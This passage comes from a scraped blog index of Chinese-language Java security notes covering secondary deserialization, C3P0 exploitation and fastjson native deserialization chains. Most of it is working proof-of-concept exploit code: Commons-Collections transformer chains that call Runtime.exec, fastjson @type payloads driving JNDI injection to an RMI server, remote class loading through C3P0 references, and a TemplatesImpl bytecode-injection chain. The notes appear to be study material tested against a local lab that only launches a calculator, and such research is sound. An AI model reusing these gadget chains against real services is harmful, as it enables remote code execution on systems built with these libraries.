oos.close(); byte[] serializedBytes = bos.toByteArray(); // 将字节数组进行 Base64 编码并输出 String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes); System.out.println(\u0026#34;Base64编码后的序列化数据：\u0026#34;); System.out.println(base64Encoded); String base64_String=base64Encoded; JMXServiceURL url = new JMXServiceURL(\u0026#34;service:jmx:rmi://\u0026#34;); setFieldValue(url,\u0026#34;urlPath\u0026#34;,\u0026#34;/stub/\u0026#34;+base64_String); RMIConnector rmi = new RMIConnector(url,null); Transformer[] fakeTransformer1 = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart1 = new Transformer[]{new ConstantTransformer(rmi),new InvokerTransformer(\u0026#34;connect\u0026#34;,null,null)};//注意一下这里的无参数形参的代表 Transformer chain1 = new ChainedTransformer(fakeTransformer1); HashMap haha1 = new HashMap(); Map lazy1 = LazyMap.decorate(haha1,chain1); TiedMapEntry outerMap1 = new TiedMapEntry(lazy1,\u0026#34;fupanc\u0026#34;); HashMap hashMap1 = new HashMap(); hashMap1.put(outerMap1,\u0026#34;fupanc\u0026#34;); haha1.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x1.setAccessible(true); x1.set(chain1,chainpart1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap1); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ————————\n这里还要提到一个点，在findRMIServer()方法处，前面我们都是从findRMIServerJRMP()方法入手，这里也确实比较符合二次反序列化的例子，但是其实还有另外一个点可以利用： 这里就是要求以/jndi/来开头，可以跟进一下这里的findRMIServerJNDI()方法： 经典的(new InitialContext()).lookup()，这里可以进行jndi注入，具体就看jndi注入的笔记。\nWrapperConnectionPoolDataSource C3P0中的一个存在二次反序列化链子，主要还是需要结合可调用setter的链子来利用，通过对WrapperConnectionPoolDataSource类调用setUserOverridesAsString()方法从而一步一步调用到SerializableUtils类的deserializeFromByteArray()方法实现二次反序列化： 主要调用setter的链子存在于jackson和fastjson反序列化。\n参考文章：\nhttps://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBKbwiKGOjb%3D13a4D#toc-1\n《MapMessage二次反序列化》\n","date":"2025-05-01T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Java二次反序列化"},{"content":"C3P0 概述 C3P0是一个开源的数据库连接池，它实现了数据源于JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。\n连接池的定义：连接池类似于线程池，简单来说其实就是这里定义了一个句柄，当需要进行数据库连接时会直接使用这个句柄，而不是多次重复频繁地创建或销毁句柄，造成很大的资源消耗。而当不使用时将其放回到连接池中。\n为了避免频繁地创建和销毁JDBC链接，我们就可以通过连接池（Connection Pool）复用已经创建好的连接。\nmaven依赖如下：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.mchange\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;c3p0\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.9.5.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试环境：\nJDK8u71 利用 常见的利用方式有如下三种：\nURLClassLoader远程类加载 JNDI注入 利用HEX序列化字节加载器进行反序列化攻击 URLClassLoader远程类加载 URLClassLoader这个类加载器也是前面了解过的，可以用来加载远程类，这里的调用链过程如下：\n1 2 3 4 PoolBackedDataSourceBase#readObject ReferenceSerialized#getObject ReferenceableUtils#referenceToObject ObjectFactory#getObjectInstance 跟进PoolBackedDataSourceBase类的readObject()方法：\n满足这里反序列化出来的类是IndirectlySerialized的实现类就会调用到这个类的getObject()方法，看一下PoolBackedDataSourceBase类的writeObject()方法：\n可以看到反序列化要利用的类对应的就是connectionPoolDataSource变量，变量定义如下：\n还有个setter方法来对这个变量进行设值，要求类型为ConnectionPoolDataSource，但是这个类型相对应的类是没有实现Serializable接口的，所以是不可序列化的，在尝试序列化是会直接报错进行到catch语句，主要实现逻辑就是SerializableUtils.toByteArray()方法会尝试进行序列化，这里的SerializableUtils类的toByteArray()方法会调用serializeToByteArray()方法：\n也就是会先检测是否可以序列化。\n所以其实在writeObject()方法中，是会在catch中进行序列化：\n可以看到这里是实例化了一个ReferenceIndirector类，然后调用这个类的indirectForm()方法，最后序列化这个方法返回的类，那么我们跟进ReferenceIndirector类的indirectForm()方法：\n可以看到这里对传进来的类实例调用了一个getReference()方法，这个getReference()方法在我们学习jndi注入时还是比较常用，就是获取被引用的类，然后实例化了一个ReferenceSerialized被用于序列化。\n看了一下，这个ReferenceSerialized类是实现了IndirectlySerialized接口的，所以这里是可以在反序列化时正常利用的。\n再看反序列化调用，那么就会调用到ReferenceSerialized类的getObject()方法：\n如果这里的contextName变量可控的话，那么就可以打一次jndi注入，溯源了一下contextName的赋值，想要利用的话，其实就是需要控制ReferenceIndirector类的初始化，但是这个类是在序列化时直接初始化的，不可控。\n那么继续跟进ReferenceableUtils类的referenceToObject()方法：\n可以看到是调用了URLClassLoader类加载器来进行远程类加载，主要的需要利用的点是ref，并且这个是可控的，就是序列化时调用getReference()方法得到的类：\n所以现在主要的点就是看这里我们需要将这个o设置成什么类，也就是PoolBackedDataSourceBase类的connectionPoolDataSource变量设置成什么需要的类，可以发现这里是有一个类型转换的，强制转换为了Referenceable，根据这个接口类找了一下，没发现可以直接利用的类。\n那么这里可以尝试自己实现这个类，在序列化时将其写进去（这里有点问题，看后面会有说明，可以先自己想一下为什么之类需要自定义类，具体的实现过程又是什么），达到在反序列化时成功调用的效果，就是需要满足一些条件，以使得可以在序列化或者反序列化时达到想要的效果：\n没有实现Serializable接口 实现ConnectionPoolDataSource接口 实现Referenceable接口 最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 package C3P0; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.io.*; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class Main { public static void main(String[] args) throws Exception { PoolBackedDataSourceBase pool = new PoolBackedDataSourceBase(false); Reference ref = new Reference(\u0026#34;MyTest\u0026#34;, \u0026#34;MyTest\u0026#34;, \u0026#34;http://127.0.0.1:7979/\u0026#34;); PoolTest poolTest = new PoolTest(ref); pool.setConnectionPoolDataSource(poolTest); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(pool); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } class PoolTest implements Referenceable,ConnectionPoolDataSource{ public Reference reference; public PoolTest(Reference reference){ this.reference = reference; } @Override public Reference getReference() throws NamingException { return this.reference; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } 需要定义一个远程HTTP服务用于类加载：\n然后运行即可弹出计算机。\n————\n对于这里自定义类的利用方法，在反序列化时调试了一下，其实是一个非常好用的点，这里我自定义了一个PoolTest类，只是用于一个过渡，只是为了在序列化时放入想要的类：\n序列化正常调用时会调用到如上的方法，我们最后要序列化的类是ReferenceSerialized类，这里我们自定义了PoolTest类，为的就是能够在这里调用getTeference()方法时返回一个定义好了的Reference类，这样在反序列化调用到ReferenceSerialized类的getObject()方法时可以利用到我们构造好的Reference，从而达到远程类加载的过程。所以其实这里序列化是完全没有序列化自定义的PoolTest类的，只是起到了一个过渡的作用，用来提供我们需要利用的Reference类。\n最后，可以注意到ReferenceableUtils类的referenceToObject()方法调用Class.forname()时，是设置为了true的，所以可以尝试直接在Class.forName()时直接进行命令执行，而不是调用newInstance()方法时才命令执行，并且测试成功。\n打本地类* 算是上面的URLClassLoader的延伸，当Reference类的classFactoryLocation为null时，就不会进行远程类加载，而是在本地进行寻找利用。这里可以参考高版本jndi注入的打法，参考如下文章：\nhttps://xz.aliyun.com/news/11340\n————————\n结合fastjson达到JNDI注入 这里主要是需要调用到setter方法，需要找一个可以触发setter方法的利用点，比较经典的就是fastjson了，当然jackson应该也可以。\n这里的sink点位于JndiRefForwardingDataSource类的dereference()方法：\n简单看了一下这里关键的getJndiName()方法，这个方法存在于父类JndiRefDataSourceBase中，然后还有setter来进行设置值：\n从代码逻辑看是可以将其设置为一个字符串类型的，可以尝试打jndi注入。\n那么看哪里调用了dereference()方法，全局搜索看到在inner()方法有调用：\n再看哪里调用了inner()方法： 主要就是如上的几个getter和setter可以调用。\n感觉可以直接打反序列化调用链触发getter方法。但是这个类没有被public修饰，而是被final修饰，外部无法实例化，只能放弃从反序列化调用链来打。\n但是可以看到还有setter方法有调用到inner()方法，所以我们可以尝试打fastjson反序列化触发，这里以低版本的fastjson反序列化为例来触发：\n1 2 3 4 5 6 7 8 9 10 11 package C3P0; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Main{ public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\u0026#34;,\\\u0026#34;jndiName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Hello\\\u0026#34;,\\\u0026#34;loginTimeout\\\u0026#34;:\\\u0026#34;1\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 成功弹出计算机。\n——————\n但是看网上的文章，是打的另外一个类，但本质也是调用的setLoginTimeout()方法来进行的jndi注入，多加了几个过渡类并且入口类也不同了，可以用来绕过，学习一下。\n定位到JndiRefConnectionPoolDataSource类的setLoginTimeout()方法：\n跟进wcpds变量的赋值，发现在JndiRefConnectionPoolDataSource类实例化时有对变量赋值的操作：\n可以看这里实例化了一个JndiRefForwardingDataSource类实例，也就是前面利用到的类，这里还实例化了一个WrapperConnectionPoolDataSource类。我们可以看到这里调用了setNestedDataSource方法来对WrapperConnectionPoolDataSource类变量进行赋值： 也就是将WrapperConnectionPoolDataSource类的变量nestedDataSource赋值为JndiRefForwardingDataSource类实例。\n再看JndiRefConnectionPoolDataSource类的setLoginTimeout()方法：\n这里会调用WrapperConnectionPoolDataSource类父类WrapperConnectionPoolDataSourceBase的setLoginTimeout()方法：\n看这里的getNestedDataSource()方法：\n对应的就是前面的jrfds变量，也就是JndiRefForwardingDataSource类实例，那么之类就是可以调用到JndiRefForwardingDataSource类的setLoginTimeout()方法，实现一次前面分析过的触发jndi注入的调用链。\n并且JndiRefConnectionPoolDataSource类提供了setJndiName()方法来对变量进行赋值：\n这样就赋值需要满足的条件了。\n基本过程已经清晰，如下POC：\n1 2 3 4 5 6 7 8 9 10 11 package C3P0; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Main{ public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\\u0026#34;,\\\u0026#34;jndiName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Hello\\\u0026#34;,\\\u0026#34;loginTimeout\\\u0026#34;:\\\u0026#34;1\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 也是打jndi弹出计算机。\n——————\n看思路的过程中，我对于打fastjson反序列化调用链的想法又死灰复燃了：\n可以看到JndiRefConnectionPoolDataSource类是public修饰的类，并且有public的构造方法，还实现了Serializable接口：\n并且还定义了JndiRefForwardingDataSource类可以调用到inner()方法的几个方法：\n就反序列化来说，为了方便，这里肯定是需要利用getter，这里的getLoginTimeout()就非常符合，对于wcpds调用的getLoginTimeout()方法，其实我在前面的截图也是截出来了的：\n熟悉的getNestedDataSource()方法，熟悉的JndiRefForwardingDataSource类实例，并且正如前面分析，JndiRefConnectionPoolDataSource类还提供了一个setJndiName()方法来给我们需要改变的变量赋值。完美符合，那么可以尝试构造如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package C3P0; import com.alibaba.fastjson.JSONObject; import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception{ JndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource(false); jndiRefConnectionPoolDataSource.setJndiName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,jndiRefConnectionPoolDataSource); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field f = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); f.setAccessible(true); f.set(bad,jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } 运行报错，并且调试也调试不动，查看报错内容：\n可以看到主要是和一个reregister有关，在想是不是JndiRefConnectionPoolDataSource的父类实现了readObject()，简单跟进了IdentityTokenResolvable类，确实存在报错中弹出的几个方法：\n在这里我看到了一个C3P0Registry.reregister()方法，想到了在初始化JndiRefConnectionPoolDataSource类时也有这方面的代码：\n为了方便我把autoregister设置成了false，可以少分析一些代码，那么这里将其设置为true尝试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package C3P0; import com.alibaba.fastjson.JSONObject; import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception{ JndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource(); jndiRefConnectionPoolDataSource.setJndiName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,jndiRefConnectionPoolDataSource); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field f = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); f.setAccessible(true); f.set(bad,jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } 成功弹出计算机。\n哦哦哦哦，成功了！！！\n但是在调试过程中，可以发现是调用的另外的getter方法，而不是我们想要利用的getLoginTimeout()方法：\n影响不大，因为JndiRefForwardingDataSource类的getLogWriter()方法也是调用了inner()方法的，也是前面一直都在截图中表现出来的：\n最后成功在反序列化调用链中实现jndi注入，后面看了一下，rome链应该也可以触发这个getter方法从而来打jndi注入，链子就不搓了，都差不多的。\n综上，有三个利用点。\nHex序列化 这里利用到的类是WrapperConnectionPoolDataSource，这个类位于com.mchange.v2.c3p0.WrapperConnectionPoolDataSource，其实前面打jndi那里都是说过的。在这里可以用来打二次反序列化。\n————————\n定位到这个类的构造方法：\n这里先分析图中框出来的方法，在参数传递中，这里会调用getUserOverridesAsString()方法，这里会调用到父类WrapperConnectionPoolDataSourceBase的getUserOverridesAsString()方法：\n会返回这个值。\n那么现在跟进C3P0ImplUtils类的parseUserOverridesAsString()方法：\n可以看到对字符串进行了截取操作，获取的HASM_HEADER变量长度然后再进行的截取，看一下这个变量的定义：\n可以看到是有硬编码进去的变量，然后我注意到这里的一个方法：createUserOverridesAsString()，不管是方法名或者这里逻辑，感觉都非常符合前面的截取操作，方法中间调用的SerializableUtils.toByteArray是一个序列化操作，跟进就知道了，并且外面套的ByteUtils类的toHexAscii()方法是一个hex编码的操作，和后面的分析也非常符合，这么巧？先不管，后续利用的时候再看看。\n然后调用了ByteUtils类的fromHexAscii()方法，这是一个hex解码的操作，然后再跟进会调用的SerializableUtils类的fromByteArray()方法：\n再跟进deserializeFromByteArray()方法：\n这里有一个反序列化的操作，那么现在就是看怎么控制这个bytes变量了。\n从前面的分析中，我们其实已经可控这个userOverridesAsString变量了，唯一问题就是怎么进行利用，直接看一个正面使用例子，再慢慢分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package C3P0; import com.mchange.v2.c3p0.impl.C3P0ImplUtils; import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource; import java.lang.reflect.Field; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception{ Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = new WrapperConnectionPoolDataSource(); String hex = C3P0ImplUtils.createUserOverridesAsString(hashMap); System.out.println(hex); wrapperConnectionPoolDataSource.setUserOverridesAsString(hex); } } 运行弹出计算机。现在肯定还存在疑问，不是只在实例化时才会调用parseUserOverridesAsString()方法，从而可以触发到反序列化，但是刚开始序列化时是没有值的，是进行不了的，放入值是在后面的setUserOverridesAsString()方法中，为什么可以利用到呢？其实重点就是这个setUserOverridesAsString()方法，看后续分析。\n这里要先说明几个点：\n对于hex编码以及长度控制，我这里是直接利用的C3P0ImplUtils类的createUserOverridesAsString()方法，这个方法要求参数为Map类型：\n并且这个方法是静态方法，调用静态方法可通过类名访问或者对象访问。所以我这里是通过C3P0ImplUtils.createUserOverridesAsString()方法直接生成的需要的数据。\n当然如果是网上的利用方法，应该是可以接其他的入口类的，我这里就只能接Map实现对象。\n———\n现在再来看这个setUserOverridesAsString()方法，可以在CC链的Transform方法打一个断点来看调用栈，比较关键的就是如下：\n1 2 3 4 5 6 7 8 9 readObject:371, ObjectInputStream (java.io) deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser) fromByteArray:123, SerializableUtils (com.mchange.v2.ser) parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl) vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0) fireVetoableChange:375, VetoableChangeSupport (java.beans) fireVetoableChange:271, VetoableChangeSupport (java.beans) setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl) main:36, Main (C3P0) 调试跟进setUserOverridesAsString()方法：\n原先的userOverridesAsString本来就没有赋值，所以为null，跟进eqOrBothNull()方法： 很正常会返回false，看这里的vcs变量的定义：\n看一下VetoableChangeSupport类的实例化：\n所以这里的vcs变量定义如下是非常正常的：\n所以会调用到VetoableChangeSupport类的fireVetoableChange()方法：\n实例化了一个PropertyChangeEvent类，效果如下：\n再回去看，会调用到另一个重载的fireVetoableChange()方法，比较关键的如下代码：\n然后会调用到WrapperConnectionPoolDataSource类的setUpPropertyListeners()方法，其实这个方法在WrapperConnectionPoolDataSource类初始化事也调用了的，看这个方法内部： 可以看到再次调用了C3P0ImplUtils类的parseUserOverridesAsString()方法，这里的过程就和前面分析的差不多了，就不多赘述了。\n所以这里就是利用到这个setter方法即可，在fastjson中的打法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package C3P0; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.mchange.v2.c3p0.impl.C3P0ImplUtils; import java.lang.reflect.Field; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception{ Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); String hex = C3P0ImplUtils.createUserOverridesAsString(hashMap); System.out.println(hex); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\u0026#34;,\\\u0026#34;userOverridesAsString\\\u0026#34;:\\\u0026#34;\u0026#34;+hex+\u0026#34;\\\u0026#34;}\u0026#34;; // System.out.println(json); JSONObject obj = JSON.parseObject(json); } } 运行弹出计算机。\n对于这一部分的说法，这一篇先知文章的说法也是挺有意思的，监听改变然后进行处理：https://xz.aliyun.com/news/11340\n这样的话就利用不了，监听属性，那么肯定是需要类的属性有改变，对于getter方法的调用是无法进行的。\n最后，其实上面的点大部分都是调用的setter，只是我找到了一条触发getter的反序列化调用链，调用setter都是使用的fastjson，档案使用jackson应该也是可以的。\n参考文章：\nhttps://nivi4.notion.site/C3P0-5f394336d9604e8ca80e0bb55c4ce473\n","date":"2025-04-27T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/c3p0/","title":"C3P0"},{"content":"fastjson反序列化调用链分析 前面学了fastjson反序列化，从json字符串的反序列化来进行payload构造，这里来了解一下fastjson原生反序列化，也就是比较常打的反序列化调用链。\nFastjson\u0026lt;=1.2.48\u0026amp;2 这里以1.2.48版本为例进行构造，在fastjson1版本下的\u0026gt;=1.2.49需要有一定的绕过方法，这个后面会讲。\n这里可以利用的类是JSONObject以及JSONArray类，存在利用点的是这两个类的toString()方法，这两个类本身没有实现toString()方法，但是这两个类的父类都是JSON类，JSON实现的toString()方法如下：\n这个toString()方法调用了toJSONString()方法，这个方法也比较熟悉了，就是JSON序列化调用的方法，可以调用到对应类的getter方法，现在的思路就是序列化JSONObject或者JSONArray类，那么这里的具体过程是什么呢，个人简单从代码层面跟进了一下原理（可能有误）：\nJSONObejct链 跟进toJSONString()方法： 会调用JSONSerializer类的write()方法，注意参数的传递，也就是这里的this代表我们想要利用的JSONObject类，值得一提的是JSONSerializer类的config变量，后面会用：\ngetGlobalInstance()方法返回的其实就是SerializeConfig类实例，自己跟一下就知道了。\n然后跟进JSONSerializer类的write()方法： 这里会调用getObjectWriter()方法，然后会调用SerializeConfig类的getObjectWriter()方法：\n如下：\n注意参数传递，那么这里的clazz就是JSONObject的Class对象，现在注意点放在serializers变量中，搜索发现是在SerializeConfig初始化方法中有定义，构造方法中定义initSerializers()方法用于初始化这个变量，里面放入了一些键值对：\n但是并没有JSONObject.class这种类型的，继续看getObjectWriter()方法，后续可以看到一个定义：\n这里的isAssignableFrom()方法就是判断clazz是否实现Map接口，而JSONObject确实是实现了这个接口，所以这里会放入一个JSONObject：MapSerializer类实例的键值对，并且会在后面取值然后返回：\n回到JSONSerializer类的write()方法，然后会调用MapSerializer类的write()方法，先是获取到JSONObject类的map变量： 然后for循环对map中的键值对进行处理，关注到这个方法中对value的处理如下： 一次完整的序列化过程，所以这里是可以调用到getter方法，那么就可以尝试打TemplatesImpl类的getOutputProperties()方法了，调用toString()方法的话就还是使用CC5的即可，所以可以构造POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行后成功弹出计算机。再次调试，过程与分析的基本相同，有一点有错，获取JSONObject的map并没有按照预期：\n而是直接在for循环那里调用对应方法返回的值：\nJSONObject类的entrySet()方法：\n其他的就差不多了。\nJSONArray链 这个其实也是和前面JSONObject过程是差不多的，只是JSONArray类实现的是List.class，对应的获取到的writer就是ListSerializer类实例：\n也就是会调用ListSerializer类的writer()方法，这个writer方法同样是调用了for循环来进行获取值并序列化的操作，大体过程如下：\n赋值：\nfor循环取值： 这里会调用到JSONArray类的get()方法：\n也就是获取相对应存储值的操作，然后有进行序列化的操作：\n具体是哪个还不知道，现在同样可以尝试构造如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import 